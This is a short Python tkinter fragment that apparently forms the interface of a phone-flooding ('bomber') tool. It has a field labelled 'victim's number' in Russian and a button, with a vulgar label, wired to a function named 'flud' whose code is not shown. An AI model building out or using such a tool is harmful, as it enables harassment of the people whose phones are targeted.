t1 = Label(root,
    text = 'Номерок жертвы', 
    font = ("Segoe Script", "16"),
    bg = '#1c0f1a',
    fg = '#f216ce')
t1.pack()
t1.place(x = 0, y = 0)

e1 = Entry(root, 
    font = ("Segoe Script", "16"),
    bg = '#1c0f1a',
    fg = '#f216ce')
e1.pack()
e1.place(x = 0, y = 30)

b1 = Button(root, 
    text = "Захуярить",
    font = ("Segoe Script", "16"),
    bg = '#1c0f1a',
    fg = '#f216ce',
    command = flud)
b1.pack()
b1.place(x = 0, y = 67)

logs = tkscrolled.ScrolledText(root,
    fg = '#fc12d5',
    bg = "#0d0d0d",
    height = 22,
    width = 44,
    wrap = 'word',
    font = 15 )
logs.pack()
logs.place(x = 400, y = 0)

news = News()
news.start()
root.mainloop()
